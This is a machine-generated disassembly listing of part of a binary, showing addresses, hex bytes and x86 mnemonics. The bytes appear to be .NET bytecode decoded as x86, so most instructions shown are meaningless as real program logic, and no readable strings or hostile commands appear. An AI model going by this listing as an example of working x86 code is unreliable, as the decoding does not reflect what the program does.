  402b3d:	00 00                	add    %al,(%eax)
  402b3f:	00 0d 00 00 00 00    	add    %cl,0x0
  402b45:	00 00                	add    %al,(%eax)
  402b47:	00 00                	add    %al,(%eax)
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	00 13                	add    %dl,(%ebx)
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	00 00                	add    %al,(%eax)
  402b51:	01 00                	add    %eax,(%eax)
  402b53:	00 13                	add    %dl,(%ebx)
  402b55:	01 00                	add    %eax,(%eax)
  402b57:	00 0b                	add    %cl,(%ebx)
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	00 0f                	add    %cl,(%edi)
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	01 02                	add    %eax,(%edx)
  402b61:	00 00                	add    %al,(%eax)
  402b63:	00 09                	add    %cl,(%ecx)
  402b65:	00 00                	add    %al,(%eax)
  402b67:	00 18                	add    %bl,(%eax)
  402b69:	01 00                	add    %eax,(%eax)
  402b6b:	00 21                	add    %ah,(%ecx)
  402b6d:	01 00                	add    %eax,(%eax)
  402b6f:	00 0b                	add    %cl,(%ebx)
  402b71:	00 00                	add    %al,(%eax)
  402b73:	00 00                	add    %al,(%eax)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	00 1b                	add    %bl,(%ebx)
  402b79:	30 02                	xor    %al,(%edx)
  402b7b:	00 75 00             	add    %dh,0x0(%ebp)
  402b7e:	00 00                	add    %al,(%eax)
  402b80:	07                   	pop    %es
  402b81:	00 00                	add    %al,(%eax)
  402b83:	11 00                	adc    %eax,(%eax)
  402b85:	00 73 4d             	add    %dh,0x4d(%ebx)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 0a                	or     (%edx),%cl
  402b8c:	06                   	push   %es
  402b8d:	72 f1                	jb     0x402b80
  402b8f:	01 00                	add    %eax,(%eax)
  402b91:	70 6f                	jo     0x402c02
  402b93:	4e                   	dec    %esi
  402b94:	00 00                	add    %al,(%eax)
  402b96:	0a 72 ff             	or     -0x1(%edx),%dh
  402b99:	01 00                	add    %eax,(%eax)
  402b9b:	70 6f                	jo     0x402c0c
  402b9d:	4f                   	dec    %edi
  402b9e:	00 00                	add    %al,(%eax)
  402ba0:	0a 00                	or     (%eax),%al
  402ba2:	06                   	push   %es
  402ba3:	72 09                	jb     0x402bae
  402ba5:	02 00                	add    (%eax),%al
  402ba7:	70 6f                	jo     0x402c18
  402ba9:	4e                   	dec    %esi
  402baa:	00 00                	add    %al,(%eax)
  402bac:	0a 28                	or     (%eax),%ch
  402bae:	36 00 00             	add    %al,%ss:(%eax)
  402bb1:	06                   	push   %es
  402bb2:	6f                   	outsl  %ds:(%esi),(%dx)
  402bb3:	4f                   	dec    %edi
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	0a 00                	or     (%eax),%al
  402bb8:	1f                   	pop    %ds
  402bb9:	41                   	inc    %ecx
  402bba:	20 00                	and    %al,(%eax)
  402bbc:	00 08                	add    %cl,(%eax)
  402bbe:	00 73 50             	add    %dh,0x50(%ebx)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	0a 0b                	or     (%ebx),%cl
  402bc5:	06                   	push   %es
  402bc6:	72 19                	jb     0x402be1
  402bc8:	02 00                	add    (%eax),%al
  402bca:	70 6f                	jo     0x402c3b
  402bcc:	4e                   	dec    %esi
  402bcd:	00 00                	add    %al,(%eax)
  402bcf:	0a 07                	or     (%edi),%al
  402bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd2:	4f                   	dec    %edi
  402bd3:	00 00                	add    %al,(%eax)
  402bd5:	0a 00                	or     (%eax),%al
  402bd7:	06                   	push   %es
  402bd8:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd9:	51                   	push   %ecx
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 28                	or     (%eax),%ch
  402bde:	21 00                	and    %eax,(%eax)
  402be0:	00 06                	add    %al,(%esi)
  402be2:	00 28                	add    %ch,(%eax)
  402be4:	52                   	push   %edx
  402be5:	00 00                	add    %al,(%eax)
  402be7:	0a 00                	or     (%eax),%al
  402be9:	17                   	pop    %ss
  402bea:	28 1a                	sub    %bl,(%edx)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	06                   	push   %es
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	de 05 26 00 00 de    	fiadds 0xde000026
  402bf7:	00 2a                	add    %ch,(%edx)
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	00 01                	add    %al,(%ecx)
  402bfd:	10 00                	adc    %al,(%eax)
  402bff:	00 00                	add    %al,(%eax)
  402c01:	00 01                	add    %al,(%ecx)
  402c03:	00 6e 6f             	add    %ch,0x6f(%esi)
  402c06:	00 05 0f 00 00 01    	add    %al,0x100000f
  402c0c:	1b 30                	sbb    (%eax),%esi
  402c0e:	02 00                	add    (%eax),%al
  402c10:	2d 00 00 00 02       	sub    $0x2000000,%eax
  402c15:	00 00                	add    %al,(%eax)
  402c17:	11 00                	adc    %eax,(%eax)
  402c19:	00 28                	add    %ch,(%eax)
  402c1b:	19 00                	sbb    %eax,(%eax)
  402c1d:	00 06                	add    %al,(%esi)
  402c1f:	2c 07                	sub    $0x7,%al
  402c21:	28 12                	sub    %dl,(%edx)
  402c23:	00 00                	add    %al,(%eax)
  402c25:	06                   	push   %es
  402c26:	2b 01                	sub    (%ecx),%eax
  402c28:	16                   	push   %ss
  402c29:	0a 06                	or     (%esi),%al
  402c2b:	2c 0f                	sub    $0xf,%al
  402c2d:	00 28                	add    %ch,(%eax)
  402c2f:	17                   	pop    %ss
  402c30:	00 00                	add    %al,(%eax)
  402c32:	06                   	push   %es
  402c33:	17                   	pop    %ss
  402c34:	58                   	pop    %eax
  402c35:	28 18                	sub    %bl,(%eax)
  402c37:	00 00                	add    %al,(%eax)
  402c39:	06                   	push   %es
  402c3a:	00 00                	add    %al,(%eax)
  402c3c:	00 de                	add    %bl,%dh
  402c3e:	05 26 00 00 de       	add    $0xde000026,%eax
  402c43:	00 2a                	add    %ch,(%edx)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	00 01                	add    %al,(%ecx)
  402c49:	10 00                	adc    %al,(%eax)
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	00 01                	add    %al,(%ecx)
  402c4f:	00 26                	add    %ah,(%esi)
  402c51:	27                   	daa
  402c52:	00 05 0f 00 00 01    	add    %al,0x100000f
  402c58:	2e 73 14             	jae,pn 0x402c6f
  402c5b:	00 00                	add    %al,(%eax)
  402c5d:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402c63:	2a 1b                	sub    (%ebx),%bl
  402c65:	30 05 00 aa 02 00    	xor    %al,0x2aa00
  402c6b:	00 08                	add    %cl,(%eax)
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	11 00                	adc    %eax,(%eax)
  402c71:	00 7e 05             	add    %bh,0x5(%esi)
  402c74:	00 00                	add    %al,(%eax)
  402c76:	04 28                	add    $0x28,%al
  402c78:	53                   	push   %ebx
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 7e 06             	or     0x6(%esi),%bh
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	04 28                	add    $0x28,%al
  402c82:	54                   	push   %esp
  402c83:	00 00                	add    %al,(%eax)
  402c85:	0a 73 55             	or     0x55(%ebx),%dh
  402c88:	00 00                	add    %al,(%eax)
  402c8a:	0a 0a                	or     (%edx),%cl
  402c8c:	28 56 00             	sub    %dl,0x0(%esi)
  402c8f:	00 0a                	add    %cl,(%edx)
  402c91:	6f                   	outsl  %ds:(%esi),(%dx)
  402c92:	57                   	push   %edi
  402c93:	00 00                	add    %al,(%eax)
  402c95:	0a 6f 58             	or     0x58(%edi),%ch
  402c98:	00 00                	add    %al,(%eax)
  402c9a:	0a 0b                	or     (%ebx),%cl
  402c9c:	07                   	pop    %es
  402c9d:	06                   	push   %es
  402c9e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9f:	59                   	pop    %ecx
  402ca0:	00 00                	add    %al,(%eax)
  402ca2:	0a 28                	or     (%eax),%ch
  402ca4:	5a                   	pop    %edx
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402caa:	39 4a 02             	cmp    %ecx,0x2(%edx)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	00 00                	add    %al,(%eax)
  402cb1:	28 5b 00             	sub    %bl,0x0(%ebx)
  402cb4:	00 0a                	add    %cl,(%edx)
  402cb6:	13 06                	adc    (%esi),%eax
  402cb8:	16                   	push   %ss
  402cb9:	13 07                	adc    (%edi),%eax
  402cbb:	2b 3d 11 06 11 07    	sub    0x7110611,%edi
  402cc1:	9a 13 08 00 00 11 08 	lcall  $0x811,$0x813
  402cc8:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc9:	57                   	push   %edi
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 6f 58             	or     0x58(%edi),%ch
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	0a 06                	or     (%esi),%al
  402cd3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd4:	59                   	pop    %ecx
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	0a 28                	or     (%eax),%ch
  402cd9:	1f                   	pop    %ds
  402cda:	00 00                	add    %al,(%eax)
  402cdc:	0a 13                	or     (%ebx),%dl
  402cde:	09 11                	or     %edx,(%ecx)
  402ce0:	09 2c 08             	or     %ebp,(%eax,%ecx,1)
  402ce3:	11 08                	adc    %ecx,(%eax)
  402ce5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce6:	5c                   	pop    %esp
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	0a 00                	or     (%eax),%al
  402ceb:	00 de                	add    %bl,%dh
  402ced:	05 26 00 00 de       	add    $0xde000026,%eax
  402cf2:	00 00                	add    %al,(%eax)
  402cf4:	11 07                	adc    %eax,(%edi)
  402cf6:	17                   	pop    %ss
  402cf7:	58                   	pop    %eax
  402cf8:	13 07                	adc    (%edi),%eax
  402cfa:	11 07                	adc    %eax,(%edi)
  402cfc:	11 06                	adc    %eax,(%esi)
  402cfe:	8e 69 32             	mov    0x32(%ecx),%gs
  402d01:	bb 28 31 00 00       	mov    $0x3128,%ebx
  402d06:	06                   	push   %es
  402d07:	13 0a                	adc    (%edx),%ecx
  402d09:	11 0a                	adc    %ecx,(%edx)
  402d0b:	2c 74                	sub    $0x74,%al
  402d0d:	00 73 5d             	add    %dh,0x5d(%ebx)
  402d10:	00 00                	add    %al,(%eax)
  402d12:	0a 13                	or     (%ebx),%dl
  402d14:	0b 11                	or     (%ecx),%edx
  402d16:	0b 72 35             	or     0x35(%edx),%esi
  402d19:	02 00                	add    (%eax),%al
  402d1b:	70 6f                	jo     0x402d8c
  402d1d:	5e                   	pop    %esi
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	0a 00                	or     (%eax),%al
  402d22:	11 0b                	adc    %ecx,(%ebx)
  402d24:	1b 8d 4b 00 00 01    	sbb    0x100004b(%ebp),%ecx
  402d2a:	25 16 72 3d 02       	and    $0x23d7216,%eax
  402d2f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d32:	25 17 06 6f 5f       	and    $0x5f6f0617,%eax
  402d37:	00 00                	add    %al,(%eax)
  402d39:	0a 28                	or     (%eax),%ch
  402d3b:	60                   	pusha
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	0a a2 25 18 72 a7    	or     -0x588de7db(%edx),%ah
  402d44:	02 00                	add    (%eax),%al
  402d46:	70 a2                	jo     0x402cea
  402d48:	25 19 06 6f 59       	and    $0x596f0619,%eax
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	0a a2 25 1a 72 b9    	or     -0x468de5db(%edx),%ah
  402d55:	02 00                	add    (%eax),%al
  402d57:	70 a2                	jo     0x402cfb
  402d59:	28 61 00             	sub    %ah,0x0(%ecx)
  402d5c:	00 0a                	add    %cl,(%edx)
  402d5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d5f:	62 00                	bound  %eax,(%eax)
  402d61:	00 0a                	add    %cl,(%edx)
  402d63:	00 11                	add    %dl,(%ecx)
  402d65:	0b 17                	or     (%edi),%edx
  402d67:	6f                   	outsl  %ds:(%esi),(%dx)
  402d68:	63 00                	arpl   %eax,(%eax)
  402d6a:	00 0a                	add    %cl,(%edx)
  402d6c:	00 11                	add    %dl,(%ecx)
  402d6e:	0b 17                	or     (%edi),%edx
  402d70:	6f                   	outsl  %ds:(%esi),(%dx)
  402d71:	64 00 00             	add    %al,%fs:(%eax)
  402d74:	0a 00                	or     (%eax),%al
  402d76:	11 0b                	adc    %ecx,(%ebx)
  402d78:	28 65 00             	sub    %ah,0x0(%ebp)
  402d7b:	00 0a                	add    %cl,(%edx)
  402d7d:	26 00 2b             	add    %ch,%es:(%ebx)
  402d80:	52                   	push   %edx
  402d81:	00 7e 66             	add    %bh,0x66(%esi)
  402d84:	00 00                	add    %al,(%eax)
  402d86:	0a 72 cd             	or     -0x33(%edx),%dh
  402d89:	02 00                	add    (%eax),%al
  402d8b:	70 28                	jo     0x402db5
  402d8d:	67 00 00             	add    %al,(%bx,%si)
  402d90:	0a 18                	or     (%eax),%bl
  402d92:	6f                   	outsl  %ds:(%esi),(%dx)
  402d93:	68 00 00 0a 13       	push   $0x130a0000
  402d98:	0c 00                	or     $0x0,%al
  402d9a:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  402d9d:	6f                   	outsl  %ds:(%esi),(%dx)
  402d9e:	5f                   	pop    %edi
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	60                   	pusha
  402da4:	00 00                	add    %al,(%eax)
  402da6:	0a 72 2b             	or     0x2b(%edx),%dh
  402da9:	03 00                	add    (%eax),%eax
  402dab:	70 06                	jo     0x402db3
  402dad:	6f                   	outsl  %ds:(%esi),(%dx)
  402dae:	59                   	pop    %ecx
  402daf:	00 00                	add    %al,(%eax)
  402db1:	0a 72 2b             	or     0x2b(%edx),%dh
  402db4:	03 00                	add    (%eax),%eax
  402db6:	70 28                	jo     0x402de0
  402db8:	40                   	inc    %eax
  402db9:	00 00                	add    %al,(%eax)
  402dbb:	0a 6f 69             	or     0x69(%edi),%ch
  402dbe:	00 00                	add    %al,(%eax)
  402dc0:	0a 00                	or     (%eax),%al
  402dc2:	00 de                	add    %bl,%dh
  402dc4:	0d 11 0c 2c 08       	or     $0x82c0c11,%eax
  402dc9:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  402dcc:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402dd1:	dc 00                	faddl  (%eax)
  402dd3:	06                   	push   %es
  402dd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd5:	59                   	pop    %ecx
  402dd6:	00 00                	add    %al,(%eax)
  402dd8:	0a 28                	or     (%eax),%ch
  402dda:	6a 00                	push   $0x0
  402ddc:	00 0a                	add    %cl,(%edx)
  402dde:	13 0d 11 0d 2c 19    	adc    0x192c0d11,%ecx
  402de4:	00 06                	add    %al,(%esi)
  402de6:	6f                   	outsl  %ds:(%esi),(%dx)
  402de7:	59                   	pop    %ecx
  402de8:	00 00                	add    %al,(%eax)
  402dea:	0a 28                	or     (%eax),%ch
  402dec:	6b 00 00             	imul   $0x0,(%eax),%eax
  402def:	0a 00                	or     (%eax),%al
  402df1:	20 e8                	and    %ch,%al
  402df3:	03 00                	add    (%eax),%eax
  402df5:	00 28                	add    %ch,(%eax)
  402df7:	10 00                	adc    %al,(%eax)
  402df9:	00 0a                	add    %cl,(%edx)
  402dfb:	00 00                	add    %al,(%eax)
  402dfd:	06                   	push   %es
  402dfe:	6f                   	outsl  %ds:(%esi),(%dx)
  402dff:	59                   	pop    %ecx
  402e00:	00 00                	add    %al,(%eax)
  402e02:	0a 17                	or     (%edi),%dl
  402e04:	73 6c                	jae    0x402e72
  402e06:	00 00                	add    %al,(%eax)
  402e08:	0a 0d 07 28 6d 00    	or     0x6d2807,%cl
  402e0e:	00 0a                	add    %cl,(%edx)
  402e10:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  402e13:	11 04 16             	adc    %eax,(%esi,%edx,1)
  402e16:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402e19:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  402e20:	28 32                	sub    %dh,(%edx)
  402e22:	00 00                	add    %al,(%eax)
  402e24:	06                   	push   %es
  402e25:	00 28                	add    %ch,(%eax)
  402e27:	6e                   	outsb  %ds:(%esi),(%dx)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	0a 72 2f             	or     0x2f(%edx),%dh
  402e2d:	03 00                	add    (%eax),%eax
  402e2f:	70 28                	jo     0x402e59
  402e31:	6f                   	outsl  %ds:(%esi),(%dx)
  402e32:	00 00                	add    %al,(%eax)
  402e34:	0a 13                	or     (%ebx),%dl
  402e36:	05 11 05 73 70       	add    $0x70730511,%eax
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	0a 13                	or     (%ebx),%dl
  402e3f:	0e                   	push   %cs
  402e40:	00 11                	add    %dl,(%ecx)
  402e42:	0e                   	push   %cs
  402e43:	72 39                	jb     0x402e7e
  402e45:	03 00                	add    (%eax),%eax
  402e47:	70 6f                	jo     0x402eb8
  402e49:	71 00                	jno    0x402e4b
  402e4b:	00 0a                	add    %cl,(%edx)
  402e4d:	00 11                	add    %dl,(%ecx)
  402e4f:	0e                   	push   %cs
  402e50:	72 4d                	jb     0x402e9f
  402e52:	03 00                	add    (%eax),%eax
  402e54:	70 6f                	jo     0x402ec5
  402e56:	71 00                	jno    0x402e58
  402e58:	00 0a                	add    %cl,(%edx)
  402e5a:	00 11                	add    %dl,(%ecx)
  402e5c:	0e                   	push   %cs
  402e5d:	72 6d                	jb     0x402ecc
  402e5f:	03 00                	add    (%eax),%eax
  402e61:	70 06                	jo     0x402e69
  402e63:	6f                   	outsl  %ds:(%esi),(%dx)
  402e64:	59                   	pop    %ecx
  402e65:	00 00                	add    %al,(%eax)
  402e67:	0a 72 2b             	or     0x2b(%edx),%dh
  402e6a:	03 00                	add    (%eax),%eax
  402e6c:	70 28                	jo     0x402e96
  402e6e:	40                   	inc    %eax
  402e6f:	00 00                	add    %al,(%eax)
  402e71:	0a 6f 71             	or     0x71(%edi),%ch
  402e74:	00 00                	add    %al,(%eax)
  402e76:	0a 00                	or     (%eax),%al
  402e78:	11 0e                	adc    %ecx,(%esi)
  402e7a:	72 83                	jb     0x402dff
  402e7c:	03 00                	add    (%eax),%eax
  402e7e:	70 28                	jo     0x402ea8
  402e80:	72 00                	jb     0x402e82
  402e82:	00 0a                	add    %cl,(%edx)
  402e84:	28 6f 00             	sub    %ch,0x0(%edi)
  402e87:	00 0a                	add    %cl,(%edx)
  402e89:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8a:	71 00                	jno    0x402e8c
  402e8c:	00 0a                	add    %cl,(%edx)
  402e8e:	00 11                	add    %dl,(%ecx)
  402e90:	0e                   	push   %cs
  402e91:	72 8b                	jb     0x402e1e
  402e93:	03 00                	add    (%eax),%eax
  402e95:	70 11                	jo     0x402ea8
  402e97:	05 28 73 00 00       	add    $0x7328,%eax
  402e9c:	0a 72 97             	or     -0x69(%edx),%dh
  402e9f:	03 00                	add    (%eax),%eax
  402ea1:	70 28                	jo     0x402ecb
  402ea3:	40                   	inc    %eax
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	0a 6f 71             	or     0x71(%edi),%ch
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	0a 00                	or     (%eax),%al
  402ead:	00 de                	add    %bl,%dh
  402eaf:	0d 11 0e 2c 08       	or     $0x82c0e11,%eax
  402eb4:	11 0e                	adc    %ecx,(%esi)
  402eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb7:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402ebc:	dc 73 5d             	fdivl  0x5d(%ebx)
  402ebf:	00 00                	add    %al,(%eax)
  402ec1:	0a 25 11 05 6f 5e    	or     0x5e6f0511,%ah
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	0a 00                	or     (%eax),%al
  402ecb:	25 17 6f 64 00       	and    $0x646f17,%eax
  402ed0:	00 0a                	add    %cl,(%edx)
  402ed2:	00 25 16 6f 74 00    	add    %ah,0x746f16
  402ed8:	00 0a                	add    %cl,(%edx)
  402eda:	00 25 16 6f 75 00    	add    %ah,0x756f16
  402ee0:	00 0a                	add    %cl,(%edx)
  402ee2:	00 25 17 6f 63 00    	add    %ah,0x636f17
  402ee8:	00 0a                	add    %cl,(%edx)
  402eea:	00 28                	add    %ch,(%eax)
  402eec:	65 00 00             	add    %al,%gs:(%eax)
  402eef:	0a 26                	or     (%esi),%ah
  402ef1:	16                   	push   %ss
  402ef2:	28 12                	sub    %dl,(%edx)
  402ef4:	00 00                	add    %al,(%eax)
  402ef6:	0a 00                	or     (%eax),%al
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	de 1d 13 0f 00 72    	ficomps 0x72000f13
  402f00:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402f01:	03 00                	add    (%eax),%eax
  402f03:	70 11                	jo     0x402f16
  402f05:	0f 6f 76 00          	movq   0x0(%esi),%mm6
  402f09:	00 0a                	add    %cl,(%edx)
  402f0b:	28 6f 00             	sub    %ch,0x0(%edi)
  402f0e:	00 0a                	add    %cl,(%edx)
  402f10:	28 2e                	sub    %ch,(%esi)
  402f12:	00 00                	add    %al,(%eax)
  402f14:	0a 00                	or     (%eax),%al
  402f16:	00 de                	add    %bl,%dh
  402f18:	00 2a                	add    %ch,(%edx)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	41                   	inc    %ecx
  402f1d:	64 00 00             	add    %al,%fs:(%eax)
  402f20:	00 00                	add    %al,(%eax)
  402f22:	00 00                	add    %al,(%eax)
  402f24:	55                   	push   %ebp
  402f25:	00 00                	add    %al,(%eax)
  402f27:	00 29                	add    %ch,(%ecx)
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 7e 00             	add    %bh,0x0(%esi)
  402f2e:	00 00                	add    %al,(%eax)
  402f30:	05 00 00 00 0f       	add    $0xf000000,%eax
  402f35:	00 00                	add    %al,(%eax)
  402f37:	01 02                	add    %eax,(%edx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	00 29                	add    %ch,(%ecx)
  402f3d:	01 00                	add    %eax,(%eax)
  402f3f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	55                   	push   %ebp
  402f45:	01 00                	add    %eax,(%eax)
  402f47:	00 0d 00 00 00 00    	add    %cl,0x0
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 00                	add    %al,(%eax)
  402f53:	00 d0                	add    %dl,%al
  402f55:	01 00                	add    %eax,(%eax)
  402f57:	00 70 00             	add    %dh,0x0(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	40                   	inc    %eax
  402f5d:	02 00                	add    (%eax),%al
  402f5f:	00 0d 00 00 00 00    	add    %cl,0x0
  402f65:	00 00                	add    %al,(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	00 00                	add    %al,(%eax)
  402f6b:	00 01                	add    %al,(%ecx)
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	00 8b 02 00 00 8c    	add    %cl,-0x73fffffe(%ebx)
  402f75:	02 00                	add    (%eax),%al
  402f77:	00 1d 00 00 00 12    	add    %bl,0x12000000
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	01 22                	add    %esp,(%edx)
  402f81:	02 28                	add    (%eax),%ch
  402f83:	14 00                	adc    $0x0,%al
  402f85:	00 0a                	add    %cl,(%edx)
  402f87:	00 2a                	add    %ch,(%edx)
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	00 13                	add    %dl,(%ebx)
  402f8d:	30 01                	xor    %al,(%ecx)
  402f8f:	00 31                	add    %dh,(%ecx)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	00 02                	add    %al,(%edx)
  402f95:	00 00                	add    %al,(%eax)
  402f97:	11 00                	adc    %eax,(%eax)
  402f99:	28 2a                	sub    %ch,(%edx)
  402f9b:	00 00                	add    %al,(%eax)
  402f9d:	06                   	push   %es
  402f9e:	2d 1c 28 2b 00       	sub    $0x2b281c,%eax
  402fa3:	00 06                	add    %al,(%esi)
  402fa5:	2d 15 28 2c 00       	sub    $0x2c2815,%eax
  402faa:	00 06                	add    %al,(%esi)
  402fac:	2d 0e 28 28 00       	sub    $0x28280e,%eax
  402fb1:	00 06                	add    %al,(%esi)
  402fb3:	2d 07 28 29 00       	sub    $0x292807,%eax
  402fb8:	00 06                	add    %al,(%esi)
  402fba:	2b 01                	sub    (%ecx),%eax
  402fbc:	17                   	pop    %ss
  402fbd:	0a 06                	or     (%esi),%al
  402fbf:	2c 07                	sub    $0x7,%al
  402fc1:	14 28                	adc    $0x28,%al
  402fc3:	77 00                	ja     0x402fc5
  402fc5:	00 0a                	add    %cl,(%edx)
  402fc7:	00 2a                	add    %ch,(%edx)
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	00 1b                	add    %bl,(%ebx)
  402fcd:	30 02                	xor    %al,(%edx)
  402fcf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	09 00                	or     %eax,(%eax)
  402fd6:	00 11                	add    %dl,(%ecx)
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	21 00                	and    %eax,(%eax)
  402fdc:	22 e2                	and    %dl,%ah
  402fde:	33 0e                	xor    (%esi),%ecx
  402fe0:	00 00                	add    %al,(%eax)
  402fe2:	00 0a                	add    %cl,(%edx)
  402fe4:	28 78 00             	sub    %bh,0x0(%eax)
  402fe7:	00 0a                	add    %cl,(%edx)
  402fe9:	28 79 00             	sub    %bh,0x0(%ecx)
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	73 7a                	jae    0x40306a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 28                	or     (%eax),%ch
  402ff4:	7b 00                	jnp    0x402ff6
  402ff6:	00 0a                	add    %cl,(%edx)
  402ff8:	06                   	push   %es
  402ff9:	fe 02                	incb   (%edx)
  402ffb:	16                   	push   %ss
  402ffc:	fe 01                	incb   (%ecx)
  402ffe:	0b 07                	or     (%edi),%eax
  403000:	2c 04                	sub    $0x4,%al
  403002:	17                   	pop    %ss
  403003:	0c de                	or     $0xde,%al
  403005:	0c 00                	or     $0x0,%al
  403007:	de 05 26 00 00 de    	fiadds 0xde000026
  40300d:	00 16                	add    %dl,(%esi)
  40300f:	0c 2b                	or     $0x2b,%al
  403011:	00 08                	add    %cl,(%eax)
  403013:	2a 01                	sub    (%ecx),%al
  403015:	10 00                	adc    %al,(%eax)
  403017:	00 00                	add    %al,(%eax)
  403019:	00 01                	add    %al,(%ecx)
  40301b:	00 30                	add    %dh,(%eax)
  40301d:	31 00                	xor    %eax,(%eax)
  40301f:	05 0f 00 00 01       	add    $0x100000f,%eax
  403024:	1b 30                	sbb    (%eax),%esi
  403026:	02 00                	add    (%eax),%al
  403028:	32 00                	xor    (%eax),%al
  40302a:	00 00                	add    %al,(%eax)
  40302c:	0a 00                	or     (%eax),%al
  40302e:	00 11                	add    %dl,(%ecx)
  403030:	00 00                	add    %al,(%eax)
  403032:	73 7c                	jae    0x4030b0
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 28                	or     (%eax),%ch
  403038:	7d 00                	jge    0x40303a
  40303a:	00 0a                	add    %cl,(%edx)
  40303c:	6f                   	outsl  %ds:(%esi),(%dx)
  40303d:	7e 00                	jle    0x40303f
  40303f:	00 0a                	add    %cl,(%edx)
  403041:	72 cb                	jb     0x40300e
  403043:	03 00                	add    (%eax),%eax
  403045:	70 6f                	jo     0x4030b6
  403047:	7f 00                	jg     0x403049
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	0a 06                	or     (%esi),%al
  40304d:	2c 05                	sub    $0x5,%al
  40304f:	00 17                	add    %dl,(%edi)
  403051:	0b de                	or     %esi,%ebx
  403053:	0c 00                	or     $0x0,%al
  403055:	de 05 26 00 00 de    	fiadds 0xde000026
  40305b:	00 16                	add    %dl,(%esi)
  40305d:	0b 2b                	or     (%ebx),%ebp
  40305f:	00 07                	add    %al,(%edi)
  403061:	2a 00                	sub    (%eax),%al
  403063:	00 01                	add    %al,(%ecx)
  403065:	10 00                	adc    %al,(%eax)
  403067:	00 00                	add    %al,(%eax)
  403069:	00 01                	add    %al,(%ecx)
  40306b:	00 26                	add    %ah,(%esi)
  40306d:	27                   	daa
  40306e:	00 05 0f 00 00 01    	add    %al,0x100000f
  403074:	1b 30                	sbb    (%eax),%esi
  403076:	02 00                	add    (%eax),%al
  403078:	ed                   	in     (%dx),%eax
  403079:	00 00                	add    %al,(%eax)
  40307b:	00 0b                	add    %cl,(%ebx)
  40307d:	00 00                	add    %al,(%eax)
  40307f:	11 00                	adc    %eax,(%eax)
  403081:	00 72 d1             	add    %dh,-0x2f(%edx)
  403084:	03 00                	add    (%eax),%eax
  403086:	70 73                	jo     0x4030fb
  403088:	80 00 00             	addb   $0x0,(%eax)
  40308b:	0a 0a                	or     (%edx),%cl
  40308d:	00 06                	add    %al,(%esi)
  40308f:	6f                   	outsl  %ds:(%esi),(%dx)
  403090:	81 00 00 0a 0b 00    	addl   $0xb0a00,(%eax)
  403096:	00 07                	add    %al,(%edi)
  403098:	6f                   	outsl  %ds:(%esi),(%dx)
  403099:	82 00 00             	addb   $0x0,(%eax)
